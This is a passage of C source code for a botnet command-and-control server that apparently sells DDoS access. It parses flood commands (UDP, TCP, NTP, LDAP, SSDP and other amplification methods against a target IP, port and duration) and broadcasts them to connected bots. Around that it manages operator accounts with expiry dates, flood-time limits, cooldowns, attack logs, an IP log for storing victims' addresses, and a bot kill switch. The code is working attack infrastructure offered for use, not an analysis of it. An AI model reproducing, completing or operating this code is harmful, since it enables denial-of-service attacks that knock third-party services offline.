            sprintf(akira, ""CY".DM       "W"Direct Message A User\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".CLS      "W"Clear Your Terminal\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".LOGOUT   "W"Log Out\r\n\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        }
        //Admin Menu
        else if(!strcmp(buf, ".admn") || !strcmp(buf, ".ADMN")){
            if(users[akirafd].priv == 1){
                sprintf(akira, "\r\n"CY".ADDU  "W"Add A User To Database\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".ADDI  "W"Add A Valid IP To Database\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".EDIT  "W"Edit A User Account\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".DELU  "W"Delete A User Account\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".DELI  "W"Delete A Valid IP\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".KICK  "W"Kick A User From CNC\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, ""CY".LOGS  "W"View Logs\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sprintf(akira, "\r\n"CY".KILLBOTS  "W"Kill All Bots\r\n\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //DDoS Cmds [+]===================================================[+]
        if(strstr(buf, "UDP") || strstr(buf, "TCP") || strstr(buf, "STD") || strstr(buf, "XMS") || strstr(buf, "VSE") || strstr(buf, "NTP") || strstr(buf, "TS3") || strstr(buf, "LDAP") || strstr(buf, "SSDP") || strstr(buf, "MDNS") || strstr(buf, "MSSQL")){
            char atkcmd[100];
            sprintf(atkcmd, "%s", buf);
            printf(""Y"[!!!]("CY"%s"Y"): (%s)\n", users[akirafd].nick, atkcmd);
            Split_Str(atkcmd);
            if(split_argc != 4){
                sprintf(akira, "\x1b[31mSyntax Error - 'METHOD IP PORT TIME'\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
            else{
                char proto[10];
                sprintf(proto, "%s", split_argv[0]);
                unsigned int ftype = 0;
                if(!strcmp(proto, "UDP") || !strcmp(proto, "TCP") || !strcmp(proto, "STD") || !strcmp(proto, "XMS") || !strcmp(proto, "VSE")) ftype = 1;

                //Target, Port, Time
                char targ[20];
                sprintf(targ, "%s", split_argv[1]);
                if(CheckBlacklist(targ) == 1){
                    printf(""Y"[!!!]\x1b[31m[BLACKLIST][%s]: \x1b[31m%s\n", users[akirafd].nick, targ);
                    sprintf(akira, ""Y"[\x1b[31mAttack Not Sent! Host "Y"%s is Blacklisted\x1b[31m..."Y"]\r\n", targ);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                }
                else{
                    int port = atoi(split_argv[2]);
                    int duration = atoi(split_argv[3]);
                    if(duration > users[akirafd].maxsecs || strlen(split_argv[3]) > 4){
                        sprintf(akira, "\x1b[31mYou've Exceeded Your Max Flood Time! (%d)\r\n", users[akirafd].maxsecs);
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    }
                    else if(users[akirafd].cdstatus == 1){
                        sprintf(akira, "\x1b[31m["W"%s, Server is Cooling Down - %d Second(s) Left...\x1b[31m]\r\n", users[akirafd].nick, users[akirafd].cooldown - users[akirafd].cdsecs);
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    }
                    else{
#ifdef DEBUG
                        printf("Outgoing: %s\n", atkcmd);
#endif
                        //Command Devices
                        Broadcast(buf);

                        //Log Attack
                        if(!strcmp(users[akirafd].nick, "Admin") || !strcmp(users[akirafd].nick, "Tragedy")){ /*Do Nothing, Straight Logic*/ }
                        else{
                            time_t t = time(NULL);
                            struct tm tm = *localtime(&t);
                            FILE *atklog = fopen(""LFD"/ATKS.log", "a+");
                            fprintf(atklog, "(%s) %s - [%d/%d/%d %d:%d:%d]", users[akirafd].nick, atkcmd, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
                            fclose(atklog);
                        }

                        //Respond To Command
                        char atk_show[MXFDS];
                        sprintf(atk_show, ""Y"%d Bot(s) "G"Flooding "Y"%s "G"Utilizing Protocol "Y"%s"G"!"CR"\r\n", CountDevices(), targ, proto);
                        send(akirafd, atk_show, strlen(atk_show), MSG_NOSIGNAL);

                        pthread_t cdthread;
                        struct CooldownArgs argg;
                        if(users[akirafd].cooldown > 0){
                            argg.sock = akirafd;
                            argg.seconds = users[akirafd].cooldown;
                            pthread_create(&cdthread, NULL, &En_Cooldown, (void *)&argg);
                        }
                    }
                }
            }
            memset(atkcmd, 0, sizeof(atkcmd));
        }
        else if(!strcmp(buf, ".killbots") || !strcmp(buf, ".KILLBOTS")){
            if(users[akirafd].priv == 1){
                Broadcast("KILL");
                sprintf(akira, ""G"All Bot Processes Killed! Rest In Peace...\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                fprintf(adinfo, "[%s] Killed All Bots!\n", users[akirafd].nick);
                fclose(adinfo);
                printf(""Y"[!!!] [%s] Killed All Bots!\n", users[akirafd].nick);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        else if(!strcmp(buf, ".atklog") || !strcmp(buf, ".ATKLOG")){
            FILE *vwatklog;
            char *line = NULL;
            size_t len = 0;
            ssize_t read;
            vwatklog = fopen(""LFD"/ATKS.log", "r");
            if(vwatklog == NULL){
                sprintf(akira, "The Owner Broke The Logs...\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                memset(buf, 0, sizeof(buf));
            }
            send(akirafd, ""G"Parsing The Attack Log...\r\n", strlen(""G"Parsing The Attack Log...\r\n"), MSG_NOSIGNAL);
            int results = 0;
            while((read = getline(&line, &len, vwatklog)) != -1){
                if(strstr(line, users[akirafd].nick)){
                    results = 1;
                    sprintf(akira, ""Y"%s\r", line);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                }
            }
            free(line);
            fclose(vwatklog);
            if(results < 1){
                sprintf(akira, ""Y"You Currently Have No Logged Attacks!\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
        }
        //Serv Cmds [+]===============================================================================================================================================================================================Server==[+]
        else if(!strcmp(buf, ".acstats") || !strcmp(buf, ".ACSTATS")){
            sprintf(akira, AkiraY""W"--- "CY"Account Stats "W"---"AkiraY"\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, AkiraY" "W"Account Expiry - "Y"%s\r\n", users[akirafd].expiry);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, AkiraY" "W"Account Privileges - "Y"%s\r\n", printpriv);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, AkiraY" "W"Max Flood Time - "Y"%d\r\n", users[akirafd].maxsecs);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, AkiraY" "W"Cooldown - "Y"%d\r\n", users[akirafd].cooldown);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

            mylogged = 0;
            FILE *iplog;
            char *linep = NULL;
            size_t lenp = 0;
            ssize_t readp;
            iplog = fopen(""LFD"/IPLog.log", "r");
            if(iplog == NULL){ sprintf(akira, "The Owner Broke The Logs...\r\n"); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); memset(buf, 0, sizeof(buf)); continue; }
            while((readp = getline(&linep, &lenp, iplog)) != -1){
                if(strstr(linep, users[akirafd].nick)) mylogged++;
            }
            free(linep);
            fclose(iplog);
            sprintf(akira, AkiraY" "W"Logged IPs - "Y"%d\r\n", mylogged);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

            myatks = 0;
            FILE *vwatklog;
            char *line = NULL;
            size_t len = 0;
            ssize_t read;
            vwatklog = fopen(""LFD"/ATKS.log", "r");
            if(vwatklog == NULL){ sprintf(akira, "The Owner Broke The Logs...\r\n"); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); memset(buf, 0, sizeof(buf)); continue; }
            while((read = getline(&line, &len, vwatklog)) != -1){
                if(strstr(line, users[akirafd].nick)) myatks++;
            }
            free(line);
            fclose(vwatklog);
            sprintf(akira, AkiraY" "W"Total Attacks Sent - "Y"%d\r\n", myatks);
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        }
        //Change Prompt
        else if(!strcmp(buf, ".prompt") || !strcmp(buf, ".PROMPT")){
            char newprompt[BUFSIZE];
            getnewprompt:
            memset(newprompt, 0, sizeof(newprompt));
            sprintf(akira, ""W"["CY"New Prompt"W"]: "CY"");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            fdgets(newprompt, sizeof(newprompt), akirafd); trim(newprompt);

            if(strlen(newprompt) > 10){
                sprintf(akira, "\x1b[31mCannot Be More Than 10 Characters!"CR"\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                goto getnewprompt;
            }
            memset(users[akirafd].myprompt, 0, sizeof(users[akirafd].myprompt));
            sprintf(users[akirafd].myprompt, "%s", newprompt);
            memset(prompt, 0, sizeof(prompt));
            sprintf(prompt, ""W"["CY"%s"W"@"CY"%s"W"]: ", users[akirafd].nick, users[akirafd].myprompt);
        }
        //IP Log Entry
        else if(!strcmp(buf, ".logip") || !strcmp(buf, ".LOGIP")){
            char label[BUFSIZE];
            char iptolog[BUFSIZE];
            sprintf(akira, ""W"["CY"Label (Who's IP Is It?)"W"]: ");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            fdgets(label, sizeof(label), akirafd); trim(label);

            sprintf(akira, ""W"["CY"IP To Store"W"]: ");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            fdgets(iptolog, sizeof(iptolog), akirafd); trim(iptolog);

            FILE *iplog = fopen(""LFD"/IPLog.log", "a+");
            fprintf(iplog, "%s - %s (%s)", label, iptolog, users[akirafd].nick);
            fclose(iplog);

            printf("(%s) Logged IP (%s - %s)\n", users[akirafd].nick, label, iptolog);
            sprintf(akira, ""G"IP Logged Successfully!\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        }
        //View IP Log
        else if(!strcmp(buf, ".vwlog") || !strcmp(buf, ".VWLOG")){
            FILE *vwlog;
            char *line = NULL;
            size_t len = 0;
            ssize_t read;
            vwlog = fopen(""LFD"/IPLog.log", "r");
            if(vwlog == NULL){ sprintf(akira, "The Owner Broke The Logs...\r\n"); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); memset(buf, 0, sizeof(buf)); continue; }
            send(akirafd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
            while((read = getline(&line, &len, vwlog)) != -1){
                if(strstr(line, users[akirafd].nick)){ sprintf(akira, "%s\r\n", line); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); }
            }
            free(line);
            fclose(vwlog);
        }
        //Online Users
        else if(!strcmp(buf, ".online") || !strcmp(buf, ".ONLINE")){
            sprintf(akira, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            int findme; for(findme = 0; findme < MXFDS; findme++){
                if(!users[findme].connd) continue;
                if(users[akirafd].priv == 1){ sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", findme, users[findme].nick, users[findme].ip); }
                else sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s"W"\r\n", findme, users[findme].nick);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
        }
        //DM
        else if(!strcmp(buf, ".dm") || !strcmp(buf, ".DM")){
            sprintf(akira, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            int findme; for(findme = 0; findme < MXFDS; findme++){
                if(!users[findme].connd) continue;
                if(users[akirafd].priv == 1){ sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", findme, users[findme].nick, users[findme].ip); }
                else sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s"W"\r\n", findme, users[findme].nick);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }

            int pmfd, sent = 0;
            char pmuser[1024];
            char privmsg[1024];
            memset(buf, 0, sizeof(buf));
            memset(pmuser, 0, sizeof(pmuser));
            memset(privmsg, 0, sizeof(privmsg));
            sprintf(akira, ""Y"["CY"Direct Message"Y"]\r\n"Y"["CY"Username"Y"]"CY": ");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            fdgets(pmuser, sizeof(pmuser), akirafd); trim(pmuser);

            sprintf(akira, ""Y"["CY"Message"Y"]"CY": ");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            fdgets(privmsg, sizeof(privmsg), akirafd); trim(privmsg);

            for(pmfd = 0; pmfd < MXFDS; pmfd++) {
                if(users[pmfd].connd) {
                    if(!strcmp(pmuser, users[pmfd].nick)) {
                        sprintf(akira, ""Y"["CY"Message from "Y"%s"CY": "Y"%s"Y"]\r\n", users[akirafd].nick, privmsg);
                        send(pmfd, akira, strlen(akira), MSG_NOSIGNAL);
                        send(pmfd, prompt, strlen(prompt), MSG_NOSIGNAL);
                        sent = 1;
                        break;
                    }
                }
            }
            if(sent && pmuser != NULL){
                sprintf(akira, ""Y"["G"Message Sent To %s"Y"]\r\n", pmuser);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
                sent = 0;
            }
            else if(!sent){
                sprintf(akira, "\x1b[31mCouldn't Find \x1b[33m%s"W"\r\n", pmuser);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
            }
            memset(buf, 0, sizeof(buf));
        }
        //Admin CMDS [+]=================================================================================================================================================================================================Admin======[+]
        //Add Account
        else if(!strcmp(buf, ".addu") || !strcmp(buf, ".ADDU")){ //AddUser
            if(users[akirafd].priv == 1){
                int ret, kdm, priv, new_secs, new_cooldown;
                char new_user[40], new_pass[40], new_type[20], new_expr[20], new_seconds[10], newcooldown[10];
                readduser:
                memset(new_user, 0, sizeof(new_user));
                send(akirafd, ""Y"[Username]"CY": "W"", strlen(""Y"[Username]"CY": "W""), MSG_NOSIGNAL);
                fdgets(new_user, sizeof(new_user), akirafd); trim(new_user);
                if(strlen(new_user) < 3) goto readduser;
                for(kdm = 0; kdm < MXFDS; kdm++){
                    if(strstr(stats[kdm].user, new_user)){
                        sprintf(akira, "\x1b[31mThe Username "CY"%s is Already Taken..."W"\r\n", new_user);
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        goto readduser;
                    }
                }
                sleep(0.5);

                send(akirafd, ""Y"[Password]"CY": "W"", strlen(""Y"[Password]"CY": "W""), MSG_NOSIGNAL);
                fdgets(new_pass, sizeof(new_pass), akirafd); trim(new_pass);
                sleep(0.5);

                stswt:
                memset(new_type, 0, sizeof(new_type));
                send(akirafd, ""Y"[Status('REG'/'ADMIN')]"CY": "W"", strlen(""Y"[Status('REG'/'ADMIN')]"CY": "W""), MSG_NOSIGNAL);
                fdgets(new_type, sizeof(new_type), akirafd); trim(new_type);
                if(!strcmp(new_type, "reg") || !strcmp(new_type, "REG")) priv = 0;
                else if(!strcmp(new_type, "admin") || !strcmp(new_type, "ADMIN")) priv = 1;
                else goto stswt;
                sleep(0.5);

                send(akirafd, ""Y"[Expiration]-[DD/MM/YYYY Ex: '31/12/2020']"CY": "W"", strlen(""Y"[Expiration]-[DD/MM/YYYY Ex: '31/12/2020']"CY": "W""), MSG_NOSIGNAL);
                fdgets(new_expr, sizeof(new_expr), akirafd); trim(new_expr);
                sleep(0.5);

                send(akirafd, ""Y"[Max Flood Time(In Seconds)]"CY": "W"", strlen(""Y"[Max Flood Time(In Seconds)]"CY": "W""), MSG_NOSIGNAL);
                if(new_secs) new_secs = 0;
                fdgets(new_seconds, sizeof(new_seconds), akirafd); trim(new_seconds);
                new_secs = atoi(new_seconds);
                sleep(0.5);

                send(akirafd, ""Y"[Cooldown(In Seconds)]"CY": "W"", strlen(""Y"[Cooldown(In Seconds)]"CY": "W""), MSG_NOSIGNAL);
                if(new_cooldown) new_cooldown = 0;
                fdgets(newcooldown, sizeof(newcooldown), akirafd); trim(newcooldown);
                new_cooldown = atoi(newcooldown);
                sleep(0.5);

                FILE *uinfo = fopen(DB, "a+");
                fprintf(uinfo, "%s %s %d %s %d %d\n", new_user, new_pass, priv, new_expr, new_secs, new_cooldown);
                fclose(uinfo);
                FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                fprintf(adinfo, "[%s] Added User [%s]\n", users[akirafd].nick, new_user);
                fclose(adinfo);

                printf(""CY"%s "Y"Added User ["G"%s"Y"]\n", users[akirafd].nick, new_user);
                sprintf(akira, ""CY"Added User ["Y"%s"CY"]"CR"\r\n", new_user);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //Edit Account
        if(!strcmp(buf, ".edit") || !strcmp(buf, ".EDIT")){
            if(users[akirafd].priv == 1){
                char user2update[BUFSIZE];
                char userprofile[20];
                char usercurrdate[20];
                char update[20];
                char new_update_time[20];

                getuser2update:
                if(strlen(user2update) > 0) memset(user2update, 0, sizeof(user2update));
                sprintf(akira, "\t"Y"[User To Update]"CY": "W"");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                fdgets(user2update, sizeof(user2update), akirafd); trim(user2update);

                char *line = NULL;
                size_t n = 0;
                int foundresult = 0;
                FILE *edtu = fopen(DB, "r") ;
                while(getline(&line, &n, edtu) != -1 && foundresult == 0){
                    int split_wargc = 0;
                    char *split_wargv[MXPRMS + 1] = { 0 };
                    char *token = strtok(line, " ");
                    while(token != NULL && split_wargc < MXPRMS){
                        split_wargv[split_wargc++] = malloc(strlen(token) + 1);
                        strcpy(split_wargv[split_wargc - 1], token);
                        token = strtok(NULL, " ");
                    }
                    if(!strcmp(split_wargv[0], user2update)){ sprintf(userprofile, "%s", line); foundresult = 1; }
                    /*int c = 0;
                    for(c = 0; c < split_wargc; c++) memset(split_wargv[c], 0, sizeof(split_wargv[c]));
                    split_wargc = 0;*/
                }
                fclose(edtu);
                if(foundresult == 0){
                    sprintf(akira, "\t\t\x1b[31mCouldn't Find User (%s)...\r\n", user2update);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    goto getuser2update;
                }

                int split_uargc = 0;
                char *split_uargv[MXPRMS + 1] = { 0 };
                char *token = strtok(userprofile, " ");
                while (token != NULL && split_uargc < MXPRMS){
                    split_uargv[split_uargc++] = malloc(strlen(token) + 1);
                    strcpy(split_uargv[split_uargc - 1], token);
                    token = strtok(NULL, " ");
                }

                sprintf(akira, ""CR"C.Cancel\r\n"Y"1."CY"Edit Username  "Y"2."CY"Edit Password  "Y"3."CY"Edit Privileges\r\n      "Y"4."CY"Edit Expiry    "Y"5."CY"Edit Max Flood Time    "Y"6."CY"Edit Cooldown\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                send(akirafd, prompt, strlen(prompt), MSG_NOSIGNAL);
                memset(buf, 0, sizeof(buf));
                fdgets(buf, sizeof(buf), akirafd); trim(buf);
                if(!strcmp(buf, "c") || !strcmp(buf, "C")) continue;             
                else if(!strcmp(buf, "1")){
                    //Edit Username
                    char edit_username[20];
                    getedituser:
                    if(strlen(edit_username) > 0 ) memset(edit_username, 0, sizeof(edit_username));
                    sprintf(akira, "\r\n\t\t"Y"[New Username]"CY": "W"");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(edit_username, sizeof(edit_username), akirafd); trim(edit_username);
                    if(strlen(edit_username) < 3){
                        sprintf(akira, "\r\n\t\t\x1b[31mUsername Must Be 3+ Chars!"CR"\r\n");
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        goto getedituser;
                    }
                    iseduok:
                    sprintf(akira, "\r\n\t\t"Y"New Username Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_username);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic */}
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto getedituser;
                    else goto iseduok;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s %s\n", edit_username, split_uargv[1], split_uargv[2], split_uargv[3], split_uargv[4], split_uargv[5]);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Username [%s-%s]\n", users[akirafd].nick, split_uargv[0], edit_username);
                    fclose(adinfo);
                    printf(""CY"%s "Y"Edited Username [%s-%s]\n", users[akirafd].nick, split_uargv[0], edit_username);
                    sprintf(akira, "\t\t"Y"[%s] Edited Username [%s-%s]"CR"\r\n", users[akirafd].nick, split_uargv[0], edit_username);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
                else if(!strcmp(buf, "2")){
                    //Edit Pass
                    sprintf(akira, "\r\n\t\t"Y"%s's Current Password - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[1]);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                    char edit_pass[20];
                    geteditpass:
                    if(strlen(edit_pass) > 0) memset(edit_pass, 0, sizeof(edit_pass));
                    sprintf(akira, "\r\n\t\t"Y"[New Password]"CY": "W"");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(edit_pass, sizeof(edit_pass), akirafd); trim(edit_pass);
                    if(strlen(edit_pass) < 3){
                        sprintf(akira, "\t\t\x1b[31mPassword Must Be 3+ Chars!"CR"\r\n");
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        goto geteditpass;
                    }
                    isedpasok:
                    sprintf(akira, "\r\n\t\t"Y"New Password Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_pass);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic */}
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto geteditpass;
                    else goto isedpasok;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s %s\n", split_uargv[0], edit_pass, split_uargv[2], split_uargv[3], split_uargv[4], split_uargv[5]);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Password For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_pass);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited Password For %s "CY"["Y"%s"CY"]"CR"\n", users[akirafd].nick, split_uargv[0], edit_pass);
                    sprintf(akira, "\t\t"Y"[%s] Edited Password For %s [%s]\r\n", users[akirafd].nick, split_uargv[0], edit_pass);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
                else if(!strcmp(buf, "3")){
                    //Edit Priv
                    sprintf(akira, "\r\n\t\t"Y"%s's Current Status - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[2]);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                    char edit_priv[20];
                    int newpriv;
                    geteditpriv:
                    if(strlen(edit_priv) > 0 ) memset(edit_priv, 0, sizeof(edit_priv));
                    sprintf(akira, "\r\n\t\t"Y"[REG/ADMIN]"CY": "W"");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(edit_priv, sizeof(edit_priv), akirafd); trim(edit_priv);
                    if(!strcmp(edit_priv, "reg") || !strcmp(edit_priv, "REG")) newpriv == 0;
                    else if(!strcmp(edit_priv, "admin") || !strcmp(edit_priv, "ADMIN")) newpriv == 1;
                    else goto geteditpriv;
                    isedprivok:
                    sprintf(akira, "\r\n\t\t"Y"New Priviledge Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_priv);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic*/ }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto geteditpriv;
                    else goto isedprivok;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %d %s %s %s\n", split_uargv[0], split_uargv[1], newpriv, split_uargv[3], split_uargv[4], split_uargv[5]);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Priv For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_priv);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited Priv For %s "CY"["Y"%s"CY"]"CR"\n", users[akirafd].nick, split_uargv[0], edit_priv);
                    sprintf(akira, "\t\t"Y"[%s] Edited Priv For %s [%s]\r\n", users[akirafd].nick, split_uargv[0], edit_priv);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
                //Edit Expiry
                else if(!strcmp(buf, "4")){//Add Plan Time
                    sprintf(usercurrdate, "%s", split_uargv[3]);
                    sprintf(akira, "\r\n\t\t"Y"%s's Current Expiry - %s"CR"\r\n\r\n", split_uargv[0], usercurrdate);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                    int split_nuargc = 0;
                    char *split_nuargv[MXPRMS + 1] = { 0 };
                    char *ttoken = strtok(usercurrdate, "/");
                    while(ttoken != NULL && split_nuargc < MXPRMS){
                        split_nuargv[split_nuargc++] = malloc(strlen(ttoken) + 1);
                        strcpy(split_nuargv[split_nuargc - 1], ttoken);
                        ttoken = strtok(NULL, "/");
                    }
                    char cuday[10];
                    char cumnth[10];
                    char cuyear[10];
                    sprintf(cuday, "%s", split_nuargv[0]);
                    sprintf(cumnth, "%s", split_nuargv[1]);
                    sprintf(cuyear, "%s", split_nuargv[2]);

                    addtmwt:
                    memset(update, 0, sizeof(update));
                    sprintf(akira, "\t"Y"[Time To Add(1DAY/1WEEK/1MONTH/3MONTHS/6MONTHS/1YEAR)]"CY": ");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(update, sizeof(update), akirafd); trim(update);
                    if(!strcmp(update, "1day") || !strcmp(update, "1DAY") || !strcmp(update, "1week") || !strcmp(update, "1WEEK") ||  !strcmp(update, "1month") || !strcmp(update, "1MONTH") || !strcmp(update, "3months") || !strcmp(update, "3MONTHS") || !strcmp(update, "6months") || !strcmp(update, "6MONTHS") || !strcmp(update, "1year") || !strcmp(update, "1YEAR")){ /*Do Nothing, Straight Logic*/ }
                    else{
                        sprintf(akira, "\x1b[31mINVALID LENGTH - Enter: '1DAY'/'1WEEK'/'1MONTH'/'3MONTHS'/'6MONTHS'/'1YEAR'"CR"\r\n");
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        goto addtmwt;
                    }
                    memset(new_update_time, 0, sizeof(new_update_time));
                    char total_new_time[120];
#ifdef DEBUG
                    printf("Editing: %s/%s/%s ", cumonth, cuday, cuyear);
#endif
                    if(!strcmp(update, "1day") || !strcmp(update, "1DAY")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(d == 31 || d == 30){
                            if(m == 12){ y++; m = 1; d = 1; }
                            else{ m++; d = 1; }   
                        }
                        else d++;
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
